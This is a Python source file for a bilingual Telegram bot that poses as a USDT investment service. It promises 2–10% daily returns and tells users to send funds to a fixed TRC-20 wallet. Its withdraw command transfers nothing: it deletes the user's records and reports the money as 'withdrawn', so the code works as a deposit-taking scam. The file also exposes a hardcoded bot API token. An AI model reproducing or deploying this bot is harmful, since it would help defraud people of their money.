import sqlite3
import asyncio
import logging
import signal
import sys
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO)

ADMIN_ID = 644508181

API_TOKEN = "7886382317:AAFjoY017imN92-aKmcbBzSbdXWJr_f0rGA"

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

conn = sqlite3.connect("database.db")
cursor = conn.cursor()

cursor.execute("""CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    lang TEXT DEFAULT 'ru'
)""")
cursor.execute("""CREATE TABLE IF NOT EXISTS investments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    profit REAL,
    start_time TEXT,
    is_paid INTEGER DEFAULT 0
)""")
conn.commit()
try:
    cursor.execute("ALTER TABLE investments ADD COLUMN is_confirmed INTEGER DEFAULT 0")
    conn.commit()
except:
    pass


lang_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(
    KeyboardButton("🇷🇺 Русский"), KeyboardButton("🇺🇸 English")
)
main_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(
    "/tariffs", "/invest"
).add(
    "/history", "/balance", "/withdraw", "/language"
)

LANGS = {
    "ru": {
        "choose_lang": "🌍 Выберите язык:",
        "welcome": "👋 Привет! Используй кнопки ниже или команды...",
        "tariffs": "📊 *Инвестиционные тарифы:*\n\n"
                   "💵 *1 – 5 USDT* → доход *10%* в день\n"
                   "💵 *10 – 50 USDT* → доход *5%* в день\n"
                   "💵 *60 – 100 USDT* → доход *2%* в день\n\n"
                   "_Начисление происходит каждые 24 часа_",
        "invest_invalid": "❌ Укажи сумму от $1 до $100...",
        "invest_success": "✅ Ты инвестировал ${:.2f}\n📈 Прибыль через 24ч: ${:.2f}",
        "invest_help": "⚠️ Укажи сумму, например: `/invest 25`",
        "balance": "💰 Твой баланс:\nСумма инвестиций: ${:.2f}\nНачисленная прибыль: ${:.2f}",
        "withdraw_none": "💸 Нет доступных для вывода средств.",
        "withdraw_done": "✅ Выведено ${:.2f}. Спасибо!",
        "history_header": "📚 История инвестиций:\n\n",
        "no_investments": "📭 У тебя нет инвестиций.",
        "profit_notify": "💸 Прибыль ${:.2f} с ${:.2f} начислена!"
    },
    "en": {
        "choose_lang": "🌍 Choose your language:",
        "welcome": "👋 Welcome! Use the buttons or commands below...",
        "tariffs": "📊 *Investment plans:*\n\n"
                   "💵 *1 – 5 USDT* → profit *10%* daily\n"
                   "💵 *6 – 50 USDT* → profit *5%* daily\n"
                   "💵 *51 – 100 USDT* → profit *2%* daily\n\n"
                   "_Payouts every 24 hours_",
        "invest_invalid": "❌ Please enter an amount from $1 to $100...",
        "invest_success": "✅ You invested ${:.2f}\n📈 Profit in 24h: ${:.2f}",
        "invest_help": "⚠️ Usage: `/invest 25`",
        "balance": "💰 Your balance:\nTotal invested: ${:.2f}\nProfit: ${:.2f}",
        "withdraw_none": "💸 No funds to withdraw.",
        "withdraw_done": "✅ ${:.2f} withdrawn. Thank you!",
        "history_header": "📚 Investment history:\n\n",
        "no_investments": "📭 You have no investments.",
        "profit_notify": "💸 Profit ${:.2f} from ${:.2f} investment credited!"
    }
}

def t(lang: str, key: str, *args):
    text = LANGS.get(lang, LANGS["en"]).get(key, key)
    return text.format(*args) if args else text

def get_lang(user_id):
    cursor.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    r = cursor.fetchone()
    return r[0] if r else "en"

def calc_profit(amount):
    if 1 <= amount <= 5:
        return round(amount * 0.10, 2)
    elif 6 <= amount <= 50:
        return round(amount * 0.05, 2)
    elif 51 <= amount <= 100:
        return round(amount * 0.02, 2)
    return 0

@dp.message_handler(commands=["start"])
async def cmd_start(m: types.Message):
    uid, name = m.from_user.id, m.from_user.username
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (uid, name))
    conn.commit()
    lang = get_lang(uid)
    if lang not in ["ru", "en"]:
        await m.reply(t("en", "choose_lang"), reply_markup=lang_kb)
    else:
        await m.reply(t(lang, "welcome"), reply_markup=main_kb)

@dp.message_handler(lambda msg: msg.text in ["🇷🇺 Русский", "🇺🇸 English"])
async def set_lang(m: types.Message):
    lang = "ru" if "Русский" in m.text else "en"
    uid = m.from_user.id
    cursor.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, uid))
    conn.commit()
    await m.reply(t(lang, "welcome"), reply_markup=main_kb)

@dp.message_handler(commands=["language"])
async def choose_lang(m: types.Message):
    await m.reply(t(get_lang(m.from_user.id), "choose_lang"), reply_markup=lang_kb)

@dp.message_handler(commands=["tariffs"])
async def show_tariffs(m: types.Message):
    await m.reply(t(get_lang(m.from_user.id), "tariffs"), parse_mode="Markdown")

@dp.message_handler(commands=["invest"])
async def invest(m: types.Message):
    uid = m.from_user.id
    lang = get_lang(uid)
    try:
        amount = float(m.get_args())
        profit = calc_profit(amount)
        if profit == 0:
            await m.reply(t(lang, "invest_invalid"))
            return
        cursor.execute("INSERT INTO investments (user_id, amount, profit, start_time, is_confirmed) VALUES (?, ?, ?, ?, ?)",
                       (uid, amount, profit, datetime.utcnow().isoformat(), 0))
        conn.commit()
        
        # Ответ пользователю
        await m.reply(
            f"📥 Отправь ${amount:.2f} на TRC-20 адрес:\n\n"
            f"`TD19DdRMpApXtcGf197fet6qjKmmBtRGWy`\n\n"
            f"⏳ После перевода средства, админ подтвердит транзакцию.\n"
            f"📈 Прибыль: ${profit:.2f} будет начислена через 24 часа после подтверждения.",
            parse_mode="Markdown",
            reply_markup=main_kb
        )
        
        # Уведомление админу о новой инвестиции
        await bot.send_message(
            ADMIN_ID,
            f"🆕 Новая заявка на инвестицию!\n\n"
            f"👤 Пользователь: @{m.from_user.username or 'без ника'} (ID: {uid})\n"
            f"💰 Сумма: ${amount:.2f}\n"
            f"📈 Прибыль: ${profit:.2f}\n\n"
            f"Чтобы подтвердить: /confirm {uid} {amount}"
        )
        
    except:
        await m.reply(t(lang, "invest_help"))



@dp.message_handler(commands=["balance"])
async def balance(m: types.Message):
    uid = m.from_user.id
    lang = get_lang(uid)
    cursor.execute("SELECT SUM(amount) FROM investments WHERE user_id=?", (uid,))
    invested = cursor.fetchone()[0] or 0
    cursor.execute("SELECT SUM(profit) FROM investments WHERE user_id=? AND is_paid=1", (uid,))
    profit = cursor.fetchone()[0] or 0
    await m.reply(t(lang, "balance", invested, profit), reply_markup=main_kb)

@dp.message_handler(commands=["withdraw"])
async def withdraw(m: types.Message):
    uid = m.from_user.id
    lang = get_lang(uid)
    cursor.execute("SELECT SUM(amount+profit) FROM investments WHERE user_id=? AND is_paid=1", (uid,))
    amount = cursor.fetchone()[0] or 0
    if amount == 0:
        await m.reply(t(lang, "withdraw_none"), reply_markup=main_kb)
        return
    cursor.execute("DELETE FROM investments WHERE user_id=? AND is_paid=1", (uid,))
    conn.commit()
    await m.reply(t(lang, "withdraw_done", amount), reply_markup=main_kb)

@dp.message_handler(commands=["history"])
async def history(m: types.Message):
    uid = m.from_user.id
    lang = get_lang(uid)
    cursor.execute("SELECT amount, profit, start_time, is_paid FROM investments WHERE user_id=? ORDER BY start_time DESC", (uid,))
    rows = cursor.fetchall()
    if not rows:
        await m.reply(t(lang, "no_investments"), reply_markup=main_kb)
        return
    text = t(lang, "history_header")
    for amount, profit, start_time, is_paid in rows:
        status = "✅" if is_paid else "🕒"
        text += f"{status} ${amount:.2f} → ${profit:.2f} | {start_time[:19]}\n"
    await m.reply(text, reply_markup=main_kb)

@dp.message_handler(commands=["confirm"])
async def confirm(m: types.Message):
    if m.from_user.id != ADMIN_ID:
        return  # Только админ может использовать команду

    try:
        args = m.get_args().split()
        user_id = int(args[0])
        amount = float(args[1])

        cursor.execute("""
            UPDATE investments
            SET is_confirmed = 1
            WHERE user_id = ? AND amount = ? AND is_confirmed = 0
            ORDER BY start_time DESC
            LIMIT 1
        """, (user_id, amount))
        conn.commit()

        if cursor.rowcount > 0:
            await m.reply(f"✅ Инвестиция пользователя {user_id} на ${amount:.2f} подтверждена.")
            await bot.send_message(
                user_id,
                f"✅ Админ подтвердил твою инвестицию на ${amount:.2f}. "
                f"📈 Прибыль будет начислена через 24 часа."
            )
        else:
            await m.reply("❌ Не удалось подтвердить инвестицию.")
    except Exception as e:
        await m.reply(f"Ошибка: {str(e)}")


# --- Автоначисление прибыли ---
# --- Автоначисление прибыли ---
async def auto_profit():
    while True:
        cursor.execute("SELECT id, user_id, amount, profit, start_time FROM investments WHERE is_paid=0 AND is_confirmed=1")
        for inv_id, uid, amount, profit, start_time in cursor.fetchall():
            if datetime.utcnow() - datetime.fromisoformat(start_time) >= timedelta(days=1):
                cursor.execute("UPDATE investments SET is_paid=1 WHERE id=?", (inv_id,))
                conn.commit()
                try:
                    await bot.send_message(uid, t(get_lang(uid), "profit_notify", profit, amount))
                except Exception as e:
                    logging.warning(f"Не удалось отправить сообщение {uid}: {e}")
        await asyncio.sleep(3600)


async def on_startup(dp):
    asyncio.create_task(auto_profit())

async def shutdown(dp):
    await bot.close()
    conn.close()

def stop(signum, frame):
    asyncio.create_task(shutdown(dp))
    sys.exit(0)

signal.signal(signal.SIGINT, stop)
signal.signal(signal.SIGTERM, stop)

if __name__ == "__main__":
    executor.start_polling(dp, on_startup=on_startup)
